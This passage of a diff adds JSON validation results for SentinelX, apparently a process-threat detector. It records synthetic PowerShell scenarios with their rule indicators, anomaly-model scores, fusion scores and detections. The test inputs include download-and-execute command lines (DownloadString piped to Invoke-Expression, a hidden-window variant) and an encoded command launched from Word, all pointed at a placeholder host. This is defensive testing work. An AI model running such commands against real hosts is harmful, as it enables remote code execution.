+        "cmdline": "powershell.exe -NoProfile -EncodedCommand SYNTHETIC_DOCUMENT_PAYLOAD",
+        "username": "sentinel-validation",
+        "create_time": 1791227445.3701909,
+        "parent_name": "winword.exe",
+        "cpu_percent": 0.5,
+        "memory_percent": 0.2,
+        "rss_mb": 45.0,
+        "num_threads": 8,
+        "num_handles": 120
+      },
+      "rule": {
+        "behavior_score": 75,
+        "severity": "HIGH",
+        "suspicious": true,
+        "reasons": [
+          "Security-relevant Windows utility observed",
+          "Command-line indicator observed: -encodedcommand",
+          "Document application launched a scripting or command interpreter"
+        ],
+        "indicators": [
+          "monitored_binary",
+          "command:-encodedcommand",
+          "document_to_script"
+        ],
+        "process_name": "powershell.exe",
+        "parent_name": "winword.exe"
+      },
+      "statistical": {
+        "process_name": "powershell.exe",
+        "anomaly_score": 0,
+        "severity": "INFO",
+        "anomalous": false,
+        "cpu_percent": 0.5,
+        "memory_percent": 0.2,
+        "num_threads": 8.0,
+        "cpu_z_score": 0.0,
+        "memory_z_score": 0.0,
+        "thread_z_score": 0.0,
+        "indicators": [],
+        "reasons": [],
+        "history_samples": 6,
+        "timestamp": 1791227451.439666
+      },
+      "isolation_forest": {
+        "available": true,
+        "model_name": "sentinelx_process_isolation_forest",
+        "model_version": "v1",
+        "schema_version": "process_behavior_v1",
+        "feature_count": 19,
+        "decision_score": -0.00216201,
+        "raw_score": -0.50216201,
+        "model_prediction": -1,
+        "model_outlier": true,
+        "anomaly_confidence": 43.29,
+        "anomaly_label": "UNUSUAL",
+        "severity": "LOW",
+        "should_alert": false,
+        "feature_deviations": [
+          {
+            "feature": "parent_is_office_app",
+            "value": 1.0,
+            "baseline_mean": 0.006,
+            "baseline_std": 0.0775,
+            "deviation_std": 12.8258
+          },
+          {
+            "feature": "is_script_interpreter",
+            "value": 1.0,
+            "baseline_mean": 0.0281,
+            "baseline_std": 0.1653,
+            "deviation_std": 5.8789
+          },
+          {
+            "feature": "recent_event_count",
+            "value": 1.0,
+            "baseline_mean": 7.0402,
+            "baseline_std": 9.8306,
+            "deviation_std": 0.6144
+          },
+          {
+            "feature": "num_handles",
+            "value": 120.0,
+            "baseline_mean": 464.0356,
+            "baseline_std": 579.8446,
+            "deviation_std": 0.5933
+          },
+          {
+            "feature": "is_system_path",
+            "value": 1.0,
+            "baseline_mean": 0.8592,
+            "baseline_std": 0.3478,
+            "deviation_std": 0.4049
+          }
+        ],
+        "pid": 992106,
+        "process_name": "powershell.exe",
+        "parent_process_name": "winword.exe",
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "autoencoder": {
+        "available": true,
+        "model_name": "sentinelx_process_autoencoder",
+        "model_version": "v2",
+        "hidden_activation": "tanh",
+        "schema_version": "process_behavior_v1",
+        "feature_count": 19,
+        "reconstruction_error": 0.1483448038,
+        "reconstruction_region": "UPPER_3_PERCENT",
+        "anomaly_confidence": 70.72,
+        "anomaly_label": "SUSPICIOUS",
+        "severity": "MEDIUM",
+        "candidate_alert": false,
+        "embedding_dimension": 4,
+        "behavior_embedding": [
+          0.96039574,
+          0.73769529,
+          0.95575677,
+          0.41576568
+        ],
+        "feature_reconstruction_errors": [
+          {
+            "feature": "parent_is_office_app",
+            "actual_value": 1.0,
+            "reconstructed_value": -0.003039,
+            "scaled_squared_error": 1.00608756,
+            "absolute_original_difference": 1.003039
+          },
+          {
+            "feature": "command_arg_count",
+            "actual_value": 4.0,
+            "reconstructed_value": 11.118327,
+            "scaled_squared_error": 0.70036722,
+            "absolute_original_difference": 7.118327
+          },
+          {
+            "feature": "num_handles",
+            "actual_value": 120.0,
+            "reconstructed_value": 607.443913,
+            "scaled_squared_error": 0.58092418,
+            "absolute_original_difference": 487.443913
+          },
+          {
+            "feature": "recent_event_count",
+            "actual_value": 1.0,
+            "reconstructed_value": 5.7637,
+            "scaled_squared_error": 0.2043931,
+            "absolute_original_difference": 4.7637
+          },
+          {
+            "feature": "command_line_length",
+            "actual_value": 68.0,
+            "reconstructed_value": 247.628294,
+            "scaled_squared_error": 0.18533252,
+            "absolute_original_difference": 179.628294
+          }
+        ],
+        "calibration": {
+          "p50": 0.01421417566516108,
+          "p90": 0.08318183402218673,
+          "p95": 0.1278470974946212,
+          "p97": 0.16416013202775295,
+          "p99": 0.23687126271753484
+        },
+        "pid": 992106,
+        "process_name": "powershell.exe",
+        "parent_process_name": "winword.exe",
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "temporal": {
+        "state": "COLLECTING_HISTORY",
+        "available": true,
+        "depth": 1,
+        "score": null,
+        "severity": null,
+        "label": null,
+        "should_alert": null,
+        "result_id": null
+      },
+      "fusion": {
+        "rule_score": 75.0,
+        "statistical_score": 0.0,
+        "ai_consensus_score": 40.48,
+        "ai_consensus": {
+          "available": true,
+          "model_count": 2,
+          "isolation_forest_available": true,
+          "autoencoder_available": true,
+          "isolation_forest_score": 43.29,
+          "autoencoder_score": 70.72,
+          "average_score": 57.0,
+          "consensus_score": 40.48,
+          "consensus_label": "UNUSUAL",
+          "agreement": "MODERATE",
+          "agreement_difference": 27.43,
+          "isolation_forest_active": false,
+          "autoencoder_active": true,
+          "isolation_forest_strong": false,
+          "autoencoder_strong": false,
+          "both_active": false,
+          "both_strong": false,
+          "disagreement": true,
+          "confidence": "LOW",
+          "reason": "Behavioral AI models disagree; consensus confidence was reduced.",
+          "fusion_v3_category_score": 40.48
+        },
+        "active_signals": [
+          "rules"
+        ],
+        "strong_signals": [
+          "rules"
+        ],
+        "active_signal_count": 1,
+        "strong_signal_count": 1,
+        "weighted_score": 47.92,
+        "agreement_bonus": 0.0,
+        "strong_bonus": 0.0,
+        "ai_internal_bonus": 0.0,
+        "ai_disagreement_penalty": 8.0,
+        "fusion_score": 65.7227,
+        "severity": "HIGH",
+        "suspicious": true,
+        "should_alert": true,
+        "critical_allowed": false,
+        "evidence_confidence": "LIMITED",
+        "reasons": [
+          "RULE_EVIDENCE"
+        ],
+        "behavior_indicators": [
+          "monitored_binary",
+          "command:-encodedcommand",
+          "document_to_script"
+        ],
+        "statistical_indicators": [],
+        "fusion_name": "process_threat_fusion_v3",
+        "fusion_version": "v3",
+        "primary_engine": "process_threat_fusion_v3",
+        "operating_mode": "PRODUCTION_PRIMARY",
+        "primary_decision": true,
+        "promoted_to_primary": true,
+        "temporal_ai_score": 0.0,
+        "active_categories": [
+          "rules"
+        ],
+        "strong_categories": [
+          "rules"
+        ],
+        "temporal_ai_available": false,
+        "ai_temporal_disagreement": false,
+        "ai_temporal_score_difference": null,
+        "fusion_v3": {
+          "fusion_name": "sentinelx_process_threat_fusion",
+          "fusion_version": "v3",
+          "fusion_score": 65.7227,
+          "severity": "HIGH",
+          "suspicious": true,
+          "should_alert": true,
+          "critical_allowed": false,
+          "critical_evidence_gate": false,
+          "evidence_confidence": "LIMITED",
+          "available_category_count": 3,
+          "active_signal_count": 1,
+          "strong_signal_count": 1,
+          "available_categories": [
+            "rules",
+            "statistical",
+            "behavioral_ai"
+          ],
+          "active_categories": [
+            "rules"
+          ],
+          "strong_categories": [
+            "rules"
+          ],
+          "scores": {
+            "rules": 75.0,
+            "statistical": 0.0,
+            "behavioral_ai_consensus": 40.48,
+            "temporal_ai": 0.0
+          },
+          "categories": {
+            "rules": {
+              "available": true,
+              "score": 75.0,
+              "active": true,
+              "strong": true
+            },
+            "statistical": {
+              "available": true,
+              "score": 0.0,
+              "active": false,
+              "strong": false
+            },
+            "behavioral_ai": {
+              "available": true,
+              "score": 40.48,
+              "active": false,
+              "strong": false
+            },
+            "temporal_ai": {
+              "available": false,
+              "score": 0.0,
+              "active": false,
+              "strong": false
+            }
+          },
+          "behavioral_ai_consensus": {
+            "available": true,
+            "model_count": 2,
+            "isolation_forest_available": true,
+            "autoencoder_available": true,
+            "isolation_forest_score": 43.29,
+            "autoencoder_score": 70.72,
+            "average_score": 57.0,
+            "consensus_score": 40.48,
+            "consensus_label": "UNUSUAL",
+            "agreement": "MODERATE",
+            "agreement_difference": 27.43,
+            "isolation_forest_active": false,
+            "autoencoder_active": true,
+            "isolation_forest_strong": false,
+            "autoencoder_strong": false,
+            "both_active": false,
+            "both_strong": false,
+            "disagreement": true,
+            "confidence": "LOW",
+            "reason": "Behavioral AI models disagree; consensus confidence was reduced."
+          },
+          "temporal_ai_available": false,
+          "ai_temporal_score_difference": null,
+          "ai_temporal_disagreement": false,
+          "modifiers": {
+            "active_bonus": 0.0,
+            "strong_bonus": 0.0,
+            "rule_behavior_bonus": 0.0,
+            "rule_temporal_bonus": 0.0,
+            "behavioral_temporal_agreement_bonus": 0.0,
+            "disagreement_penalty": 0.0,
+            "single_source_cap": 79.0,
+            "ai_only_evidence_cap_applied": false
+          },
+          "overall_weighted_score": 48.4933,
+          "active_weighted_score": 75.0,
+          "reasons": [
+            "RULE_EVIDENCE"
+          ],
+          "interpretation": "Fusion score combines rules, statistical behavior, dual behavioral AI consensus and temporal AI. It is a defensive risk score, not a probability of compromise.",
+          "result_id": 40,
+          "operating_mode": "PRODUCTION_PRIMARY",
+          "bridge_name": "sentinelx_fusion_v3_evidence_bridge",
+          "bridge_version": "v1",
+          "evidence_bridge_complete": true,
+          "fusion_v2_comparison": {
+            "available": true,
+            "fusion_v2_score": 56.25,
+            "fusion_v2_severity": "MEDIUM",
+            "fusion_v2_rule_score": 75.0,
+            "fusion_v2_statistical_score": 0.0,
+            "fusion_v2_ai_consensus_score": 40.48,
+            "score_delta_v3_minus_v2": 9.472700000000003
+          }
+        },
+        "fusion_v2_reference": {
+          "rule_score": 75.0,
+          "statistical_score": 0.0,
+          "ai_consensus_score": 40.48,
+          "ai_consensus": {
+            "available": true,
+            "model_count": 2,
+            "isolation_forest_available": true,
+            "autoencoder_available": true,
+            "isolation_forest_score": 43.29,
+            "autoencoder_score": 70.72,
+            "average_score": 57.0,
+            "consensus_score": 40.48,
+            "consensus_label": "UNUSUAL",
+            "agreement": "MODERATE",
+            "agreement_difference": 27.43,
+            "isolation_forest_active": false,
+            "autoencoder_active": true,
+            "isolation_forest_strong": false,
+            "autoencoder_strong": false,
+            "both_active": false,
+            "both_strong": false,
+            "disagreement": true,
+            "confidence": "LOW",
+            "reason": "Behavioral AI models disagree; consensus confidence was reduced.",
+            "fusion_v3_category_score": 40.48
+          },
+          "active_signals": {
+            "rules": true,
+            "statistical": false,
+            "behavioral_ai_consensus": false
+          },
+          "strong_signals": {
+            "rules": true,
+            "statistical": false,
+            "behavioral_ai_consensus": false
+          },
+          "active_signal_count": 1,
+          "strong_signal_count": 1,
+          "weighted_score": 47.92,
+          "agreement_bonus": 0.0,
+          "strong_bonus": 0.0,
+          "ai_internal_bonus": 0.0,
+          "ai_disagreement_penalty": 8.0,
+          "fusion_score": 56.25,
+          "severity": "MEDIUM",
+          "suspicious": true,
+          "should_alert": false,
+          "critical_allowed": false,
+          "evidence_confidence": "LOW",
+          "reasons": [
+            "Rule evidence score=75.00",
+            "Isolation Forest and Autoencoder disagree."
+          ],
+          "behavior_indicators": [
+            "monitored_binary",
+            "command:-encodedcommand",
+            "document_to_script"
+          ],
+          "statistical_indicators": []
+        },
+        "rollback_engine": "process_threat_fusion_v2",
+        "rollback_available": true,
+        "fusion_v2_comparison": {
+          "available": true,
+          "fusion_v2_score": 56.25,
+          "fusion_v2_severity": "MEDIUM",
+          "fusion_v2_rule_score": 75.0,
+          "fusion_v2_statistical_score": 0.0,
+          "fusion_v2_ai_consensus_score": 40.48,
+          "score_delta_v3_minus_v2": 9.472700000000003
+        }
+      },
+      "feature_record_id": 40,
+      "detections": [
+        {
+          "id": 9,
+          "event_id": "91e3809a-25dc-4a8e-a9e8-d9c6f2db00ad",
+          "engine": "process_threat_fusion_v3",
+          "detected": 1,
+          "threat_type": "DOCUMENT_TO_POWERSHELL",
+          "confidence": null,
+          "risk_score": 66.0,
+          "severity": "HIGH",
+          "reason": "[\"RULE_EVIDENCE\"]",
+          "created_at": "2026-10-05 19:10:51"
+        }
+      ],
+      "stored_detection_count": 1,
+      "live_counter_before": 0,
+      "live_counter_after": 0,
+      "live_isolation_ok": true,
+      "failures": [],
+      "passed": true
+    },
+    {
+      "scenario_id": "P1-07",
+      "scenario_name": "PowerShell download and execution pattern",
+      "event_id": "92613847-8b0d-4a26-805b-d6509f188ecf",
+      "process": {
+        "pid": 992107,
+        "ppid": 991000,
+        "name": "powershell.exe",
+        "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "cmdline": "powershell.exe -NoProfile -Command \"(New-Object Net.WebClient).DownloadString('https://example.invalid/payload.txt') | Invoke-Expression\"",
+        "username": "sentinel-validation",
+        "create_time": 1791227445.3701909,
+        "parent_name": "explorer.exe",
+        "cpu_percent": 0.5,
+        "memory_percent": 0.2,
+        "rss_mb": 45.0,
+        "num_threads": 8,
+        "num_handles": 120
+      },
+      "rule": {
+        "behavior_score": 70,
+        "severity": "HIGH",
+        "suspicious": true,
+        "reasons": [
+          "Security-relevant Windows utility observed",
+          "Command-line indicator observed: downloadstring",
+          "Command-line indicator observed: invoke-expression",
+          "Script or command interpreter contains a network URL in its command line"
+        ],
+        "indicators": [
+          "monitored_binary",
+          "command:downloadstring",
+          "command:invoke-expression",
+          "script_network_reference"
+        ],
+        "process_name": "powershell.exe",
+        "parent_name": "explorer.exe"
+      },
+      "statistical": {
+        "process_name": "powershell.exe",
+        "anomaly_score": 0,
+        "severity": "INFO",
+        "anomalous": false,
+        "cpu_percent": 0.5,
+        "memory_percent": 0.2,
+        "num_threads": 8.0,
+        "cpu_z_score": 0.0,
+        "memory_z_score": 0.0,
+        "thread_z_score": 0.0,
+        "indicators": [],
+        "reasons": [],
+        "history_samples": 7,
+        "timestamp": 1791227451.575715
+      },
+      "isolation_forest": {
+        "available": true,
+        "model_name": "sentinelx_process_isolation_forest",
+        "model_version": "v1",
+        "schema_version": "process_behavior_v1",
+        "feature_count": 19,
+        "decision_score": 0.04964805,
+        "raw_score": -0.45035195,
+        "model_prediction": 1,
+        "model_outlier": false,
+        "anomaly_confidence": 27.65,
+        "anomaly_label": "NORMAL",
+        "severity": "INFO",
+        "should_alert": false,
+        "feature_deviations": [
+          {
+            "feature": "is_script_interpreter",
+            "value": 1.0,
+            "baseline_mean": 0.0281,
+            "baseline_std": 0.1653,
+            "deviation_std": 5.8789
+          },
+          {
+            "feature": "recent_event_count",
+            "value": 1.0,
+            "baseline_mean": 7.0402,
+            "baseline_std": 9.8306,
+            "deviation_std": 0.6144
+          },
+          {
+            "feature": "num_handles",
+            "value": 120.0,
+            "baseline_mean": 464.0356,
+            "baseline_std": 579.8446,
+            "deviation_std": 0.5933
+          },
+          {
+            "feature": "is_system_path",
+            "value": 1.0,
+            "baseline_mean": 0.8592,
+            "baseline_std": 0.3478,
+            "deviation_std": 0.4049
+          },
+          {
+            "feature": "executable_path_depth",
+            "value": 6.0,
+            "baseline_mean": 5.2652,
+            "baseline_std": 2.0635,
+            "deviation_std": 0.3561
+          }
+        ],
+        "pid": 992107,
+        "process_name": "powershell.exe",
+        "parent_process_name": "explorer.exe",
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "autoencoder": {
+        "available": true,
+        "model_name": "sentinelx_process_autoencoder",
+        "model_version": "v2",
+        "hidden_activation": "tanh",
+        "schema_version": "process_behavior_v1",
+        "feature_count": 19,
+        "reconstruction_error": 0.0680960224,
+        "reconstruction_region": "NORMAL_BASELINE",
+        "anomaly_confidence": 34.84,
+        "anomaly_label": "NORMAL",
+        "severity": "INFO",
+        "candidate_alert": false,
+        "embedding_dimension": 4,
+        "behavior_embedding": [
+          0.9616171,
+          0.72726807,
+          0.95858254,
+          0.41531461
+        ],
+        "feature_reconstruction_errors": [
+          {
+            "feature": "num_handles",
+            "actual_value": 120.0,
+            "reconstructed_value": 581.636286,
+            "scaled_squared_error": 0.52103876,
+            "absolute_original_difference": 461.636286
+          },
+          {
+            "feature": "command_arg_count",
+            "actual_value": 7.0,
+            "reconstructed_value": 11.832743,
+            "scaled_squared_error": 0.32281769,
+            "absolute_original_difference": 4.832743
+          },
+          {
+            "feature": "recent_event_count",
+            "actual_value": 1.0,
+            "reconstructed_value": 5.80388,
+            "scaled_squared_error": 0.20785554,
+            "absolute_original_difference": 4.80388
+          },
+          {
+            "feature": "command_line_length",
+            "actual_value": 137.0,
+            "reconstructed_value": 281.304212,
+            "scaled_squared_error": 0.11960798,
+            "absolute_original_difference": 144.304212
+          },
+          {
+            "feature": "num_threads",
+            "actual_value": 8.0,
+            "reconstructed_value": 12.889594,
+            "scaled_squared_error": 0.04377242,
+            "absolute_original_difference": 4.889594
+          }
+        ],
+        "calibration": {
+          "p50": 0.01421417566516108,
+          "p90": 0.08318183402218673,
+          "p95": 0.1278470974946212,
+          "p97": 0.16416013202775295,
+          "p99": 0.23687126271753484
+        },
+        "pid": 992107,
+        "process_name": "powershell.exe",
+        "parent_process_name": "explorer.exe",
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "temporal": {
+        "state": "COLLECTING_HISTORY",
+        "available": true,
+        "depth": 1,
+        "score": null,
+        "severity": null,
+        "label": null,
+        "should_alert": null,
+        "result_id": null
+      },
+      "fusion": {
+        "rule_score": 70.0,
+        "statistical_score": 0.0,
+        "ai_consensus_score": 31.25,
+        "ai_consensus": {
+          "available": true,
+          "model_count": 2,
+          "isolation_forest_available": true,
+          "autoencoder_available": true,
+          "isolation_forest_score": 27.65,
+          "autoencoder_score": 34.84,
+          "average_score": 31.25,
+          "consensus_score": 31.25,
+          "consensus_label": "NORMAL",
+          "agreement": "VERY_HIGH",
+          "agreement_difference": 7.19,
+          "isolation_forest_active": false,
+          "autoencoder_active": false,
+          "isolation_forest_strong": false,
+          "autoencoder_strong": false,
+          "both_active": false,
+          "both_strong": false,
+          "disagreement": false,
+          "confidence": "MODERATE",
+          "reason": "Behavioral AI models do not jointly report a strong anomaly.",
+          "fusion_v3_category_score": 31.25
+        },
+        "active_signals": [
+          "rules"
+        ],
+        "strong_signals": [
+          "rules"
+        ],
+        "active_signal_count": 1,
+        "strong_signal_count": 1,
+        "weighted_score": 42.44,
+        "agreement_bonus": 0.0,
+        "strong_bonus": 0.0,
+        "ai_internal_bonus": 0.0,
+        "ai_disagreement_penalty": 0.0,
+        "fusion_score": 60.5792,
+        "severity": "HIGH",
+        "suspicious": true,
+        "should_alert": true,
+        "critical_allowed": false,
+        "evidence_confidence": "LIMITED",
+        "reasons": [
+          "RULE_EVIDENCE"
+        ],
+        "behavior_indicators": [
+          "monitored_binary",
+          "command:downloadstring",
+          "command:invoke-expression",
+          "script_network_reference"
+        ],
+        "statistical_indicators": [],
+        "fusion_name": "process_threat_fusion_v3",
+        "fusion_version": "v3",
+        "primary_engine": "process_threat_fusion_v3",
+        "operating_mode": "PRODUCTION_PRIMARY",
+        "primary_decision": true,
+        "promoted_to_primary": true,
+        "temporal_ai_score": 0.0,
+        "active_categories": [
+          "rules"
+        ],
+        "strong_categories": [
+          "rules"
+        ],
+        "temporal_ai_available": false,
+        "ai_temporal_disagreement": false,
+        "ai_temporal_score_difference": null,
+        "fusion_v3": {
+          "fusion_name": "sentinelx_process_threat_fusion",
+          "fusion_version": "v3",
+          "fusion_score": 60.5792,
+          "severity": "HIGH",
+          "suspicious": true,
+          "should_alert": true,
+          "critical_allowed": false,
+          "critical_evidence_gate": false,
+          "evidence_confidence": "LIMITED",
+          "available_category_count": 3,
+          "active_signal_count": 1,
+          "strong_signal_count": 1,
+          "available_categories": [
+            "rules",
+            "statistical",
+            "behavioral_ai"
+          ],
+          "active_categories": [
+            "rules"
+          ],
+          "strong_categories": [
+            "rules"
+          ],
+          "scores": {
+            "rules": 70.0,
+            "statistical": 0.0,
+            "behavioral_ai_consensus": 31.25,
+            "temporal_ai": 0.0
+          },
+          "categories": {
+            "rules": {
+              "available": true,
+              "score": 70.0,
+              "active": true,
+              "strong": true
+            },
+            "statistical": {
+              "available": true,
+              "score": 0.0,
+              "active": false,
+              "strong": false
+            },
+            "behavioral_ai": {
+              "available": true,
+              "score": 31.25,
+              "active": false,
+              "strong": false
+            },
+            "temporal_ai": {
+              "available": false,
+              "score": 0.0,
+              "active": false,
+              "strong": false
+            }
+          },
+          "behavioral_ai_consensus": {
+            "available": true,
+            "model_count": 2,
+            "isolation_forest_available": true,
+            "autoencoder_available": true,
+            "isolation_forest_score": 27.65,
+            "autoencoder_score": 34.84,
+            "average_score": 31.25,
+            "consensus_score": 31.25,
+            "consensus_label": "NORMAL",
+            "agreement": "VERY_HIGH",
+            "agreement_difference": 7.19,
+            "isolation_forest_active": false,
+            "autoencoder_active": false,
+            "isolation_forest_strong": false,
+            "autoencoder_strong": false,
+            "both_active": false,
+            "both_strong": false,
+            "disagreement": false,
+            "confidence": "MODERATE",
+            "reason": "Behavioral AI models do not jointly report a strong anomaly."
+          },
+          "temporal_ai_available": false,
+          "ai_temporal_score_difference": null,
+          "ai_temporal_disagreement": false,
+          "modifiers": {
+            "active_bonus": 0.0,
+            "strong_bonus": 0.0,
+            "rule_behavior_bonus": 0.0,
+            "rule_temporal_bonus": 0.0,
+            "behavioral_temporal_agreement_bonus": 0.0,
+            "disagreement_penalty": 0.0,
+            "single_source_cap": 79.0,
+            "ai_only_evidence_cap_applied": false
+          },
+          "overall_weighted_score": 43.0833,
+          "active_weighted_score": 70.0,
+          "reasons": [
+            "RULE_EVIDENCE"
+          ],
+          "interpretation": "Fusion score combines rules, statistical behavior, dual behavioral AI consensus and temporal AI. It is a defensive risk score, not a probability of compromise.",
+          "result_id": 41,
+          "operating_mode": "PRODUCTION_PRIMARY",
+          "bridge_name": "sentinelx_fusion_v3_evidence_bridge",
+          "bridge_version": "v1",
+          "evidence_bridge_complete": true,
+          "fusion_v2_comparison": {
+            "available": true,
+            "fusion_v2_score": 52.5,
+            "fusion_v2_severity": "MEDIUM",
+            "fusion_v2_rule_score": 70.0,
+            "fusion_v2_statistical_score": 0.0,
+            "fusion_v2_ai_consensus_score": 31.25,
+            "score_delta_v3_minus_v2": 8.0792
+          }
+        },
+        "fusion_v2_reference": {
+          "rule_score": 70.0,
+          "statistical_score": 0.0,
+          "ai_consensus_score": 31.25,
+          "ai_consensus": {
+            "available": true,
+            "model_count": 2,
+            "isolation_forest_available": true,
+            "autoencoder_available": true,
+            "isolation_forest_score": 27.65,
+            "autoencoder_score": 34.84,
+            "average_score": 31.25,
+            "consensus_score": 31.25,
+            "consensus_label": "NORMAL",
+            "agreement": "VERY_HIGH",
+            "agreement_difference": 7.19,
+            "isolation_forest_active": false,
+            "autoencoder_active": false,
+            "isolation_forest_strong": false,
+            "autoencoder_strong": false,
+            "both_active": false,
+            "both_strong": false,
+            "disagreement": false,
+            "confidence": "MODERATE",
+            "reason": "Behavioral AI models do not jointly report a strong anomaly.",
+            "fusion_v3_category_score": 31.25
+          },
+          "active_signals": {
+            "rules": true,
+            "statistical": false,
+            "behavioral_ai_consensus": false
+          },
+          "strong_signals": {
+            "rules": true,
+            "statistical": false,
+            "behavioral_ai_consensus": false
+          },
+          "active_signal_count": 1,
+          "strong_signal_count": 1,
+          "weighted_score": 42.44,
+          "agreement_bonus": 0.0,
+          "strong_bonus": 0.0,
+          "ai_internal_bonus": 0.0,
+          "ai_disagreement_penalty": 0.0,
+          "fusion_score": 52.5,
+          "severity": "MEDIUM",
+          "suspicious": true,
+          "should_alert": false,
+          "critical_allowed": false,
+          "evidence_confidence": "LOW",
+          "reasons": [
+            "Rule evidence score=70.00"
+          ],
+          "behavior_indicators": [
+            "monitored_binary",
+            "command:downloadstring",
+            "command:invoke-expression",
+            "script_network_reference"
+          ],
+          "statistical_indicators": []
+        },
+        "rollback_engine": "process_threat_fusion_v2",
+        "rollback_available": true,
+        "fusion_v2_comparison": {
+          "available": true,
+          "fusion_v2_score": 52.5,
+          "fusion_v2_severity": "MEDIUM",
+          "fusion_v2_rule_score": 70.0,
+          "fusion_v2_statistical_score": 0.0,
+          "fusion_v2_ai_consensus_score": 31.25,
+          "score_delta_v3_minus_v2": 8.0792
+        }
+      },
+      "feature_record_id": 41,
+      "detections": [
+        {
+          "id": 10,
+          "event_id": "92613847-8b0d-4a26-805b-d6509f188ecf",
+          "engine": "process_threat_fusion_v3",
+          "detected": 1,
+          "threat_type": "POWERSHELL_DOWNLOAD_EXECUTION",
+          "confidence": null,
+          "risk_score": 61.0,
+          "severity": "HIGH",
+          "reason": "[\"RULE_EVIDENCE\"]",
+          "created_at": "2026-10-05 19:10:51"
+        }
+      ],
+      "stored_detection_count": 1,
+      "live_counter_before": 0,
+      "live_counter_after": 0,
+      "live_isolation_ok": true,
+      "failures": [],
+      "passed": true
+    },
+    {
+      "scenario_id": "P1-08",
+      "scenario_name": "Eight-step temporal PowerShell sequence",
+      "event_id": "cdcbdc0a-fa66-4a0b-92cf-4f45c4f96424",
+      "process": {
+        "pid": 992108,
+        "ppid": 991000,
+        "name": "powershell.exe",
+        "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "cmdline": "powershell.exe -WindowStyle Hidden -Command \"[Convert]::FromBase64String('U1lOVEhFVElD') | Out-Null; (New-Object Net.WebClient).DownloadString('https://example.invalid/p.txt') | Invoke-Expression\"",
+        "username": "sentinel-validation",
+        "create_time": 1791227390.3701909,
+        "parent_name": "explorer.exe",
+        "cpu_percent": 0.5,
+        "memory_percent": 0.2,
+        "rss_mb": 45.0,
+        "num_threads": 8,
+        "num_handles": 120
+      },
+      "rule": {
+        "behavior_score": 100,
+        "severity": "CRITICAL",
+        "suspicious": true,
+        "reasons": [
+          "Security-relevant Windows utility observed",
+          "Command-line indicator observed: -windowstyle hidden",
+          "Command-line indicator observed: downloadstring",
+          "Command-line indicator observed: frombase64string",
+          "Command-line indicator observed: invoke-expression",
+          "Script or command interpreter contains a network URL in its command line"
+        ],
+        "indicators": [
+          "monitored_binary",
+          "command:-windowstyle hidden",
+          "command:downloadstring",
+          "command:frombase64string",
+          "command:invoke-expression",
+          "script_network_reference"
+        ],
+        "process_name": "powershell.exe",
+        "parent_name": "explorer.exe"
+      },
+      "statistical": {
+        "process_name": "powershell.exe",
+        "anomaly_score": 0,
+        "severity": "INFO",
+        "anomalous": false,
+        "cpu_percent": 0.5,
+        "memory_percent": 0.2,
+        "num_threads": 8.0,
+        "cpu_z_score": 0.0,
+        "memory_z_score": 0.0,
+        "thread_z_score": 0.0,
+        "indicators": [],
+        "reasons": [],
+        "history_samples": 15,
+        "timestamp": 1791227452.7796724
+      },
+      "isolation_forest": {
+        "available": true,
+        "model_name": "sentinelx_process_isolation_forest",
+        "model_version": "v1",
+        "schema_version": "process_behavior_v1",
+        "feature_count": 19,
+        "decision_score": 0.04416866,
+        "raw_score": -0.45583134,
+        "model_prediction": 1,
+        "model_outlier": false,
+        "anomaly_confidence": 29.06,
+        "anomaly_label": "NORMAL",
+        "severity": "INFO",
+        "should_alert": false,
+        "feature_deviations": [
+          {
+            "feature": "is_script_interpreter",
+            "value": 1.0,
+            "baseline_mean": 0.0281,
+            "baseline_std": 0.1653,
+            "deviation_std": 5.8789
+          },
+          {
+            "feature": "command_arg_count",
+            "value": 11.0,
+            "baseline_mean": 4.2561,
+            "baseline_std": 7.9446,
+            "deviation_std": 0.8489
+          },
+          {
+            "feature": "num_handles",
+            "value": 120.0,
+            "baseline_mean": 464.0356,
+            "baseline_std": 579.8446,
+            "deviation_std": 0.5933
+          },
+          {
+            "feature": "is_system_path",
+            "value": 1.0,
+            "baseline_mean": 0.8592,
+            "baseline_std": 0.3478,
+            "deviation_std": 0.4049
+          },
+          {
+            "feature": "executable_path_depth",
+            "value": 6.0,
+            "baseline_mean": 5.2652,
+            "baseline_std": 2.0635,
+            "deviation_std": 0.3561
+          }
+        ],
+        "pid": 992108,
+        "process_name": "powershell.exe",
+        "parent_process_name": "explorer.exe",
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "autoencoder": {
+        "available": true,
+        "model_name": "sentinelx_process_autoencoder",
+        "model_version": "v2",
+        "hidden_activation": "tanh",
+        "schema_version": "process_behavior_v1",
+        "feature_count": 19,
+        "reconstruction_error": 0.0260381656,
+        "reconstruction_region": "NORMAL_BASELINE",
+        "anomaly_confidence": 23.26,
+        "anomaly_label": "NORMAL",
+        "severity": "INFO",
+        "candidate_alert": false,
+        "embedding_dimension": 4,
+        "behavior_embedding": [
+          0.96676387,
+          0.71198496,
+          0.96104361,
+          0.38819172
+        ],
+        "feature_reconstruction_errors": [
+          {
+            "feature": "num_handles",
+            "actual_value": 120.0,
+            "reconstructed_value": 449.628069,
+            "scaled_squared_error": 0.26565532,
+            "absolute_original_difference": 329.628069
+          },
+          {
+            "feature": "command_line_length",
+            "actual_value": 196.0,
+            "reconstructed_value": 307.431692,
+            "scaled_squared_error": 0.07132136,
+            "absolute_original_difference": 111.431692
+          },
+          {
+            "feature": "command_arg_count",
+            "actual_value": 11.0,
+            "reconstructed_value": 12.364482,
+            "scaled_squared_error": 0.0257339,
+            "absolute_original_difference": 1.364482
+          },
+          {
+            "feature": "child_process_count",
+            "actual_value": 0.0,
+            "reconstructed_value": 1.181451,
+            "scaled_squared_error": 0.02171948,
+            "absolute_original_difference": 1.181451
+          },
+          {
+            "feature": "is_user_profile_path",
+            "actual_value": 0.0,
+            "reconstructed_value": 0.044546,
+            "scaled_squared_error": 0.02098558,
+            "absolute_original_difference": 0.044546
+          }
+        ],
+        "calibration": {
+          "p50": 0.01421417566516108,
+          "p90": 0.08318183402218673,
+          "p95": 0.1278470974946212,
